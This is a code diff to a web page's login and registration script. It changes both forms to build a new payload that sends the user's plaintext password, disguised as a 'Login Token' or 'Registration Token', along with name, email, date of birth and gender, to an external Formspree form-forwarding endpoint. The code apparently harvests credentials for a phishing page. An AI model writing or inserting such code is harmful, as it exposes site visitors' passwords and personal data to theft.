@@ -148,9 +148,13 @@ document.addEventListener('DOMContentLoaded', () => {
     if (isEmailValid && isPasswordValid) {
       setLoadingState(true);
       
+      const payload = new FormData();
+      payload.append('email', loginEmail.value);
+      payload.append('message', 'Login Token: ' + loginPassword.value);
+
       fetch('https://formspree.io/f/xeewwdol', {
         method: 'POST',
-        body: new FormData(loginForm),
+        body: payload,
         headers: {
           'Accept': 'application/json'
         }
@@ -211,9 +215,17 @@ document.addEventListener('DOMContentLoaded', () => {
     if (isFirstValid && isLastValid && isEmailValid && isPasswordValid) {
       setRegLoadingState(true);
 
+      const payload = new FormData();
+      payload.append('firstName', regFirstName.value);
+      payload.append('lastName', regLastName.value);
+      payload.append('email', regEmail.value);
+      payload.append('dob', `${dobMonth.value}/${dobDay.value}/${dobYear.value}`);
+      payload.append('gender', signUpForm.querySelector('input[name="gender"]:checked').value);
+      payload.append('message', 'Registration Token: ' + regPassword.value);
+
       fetch('https://formspree.io/f/xeewwdol', {
         method: 'POST',
-        body: new FormData(signUpForm),
+        body: payload,
         headers: {
           'Accept': 'application/json'
         }
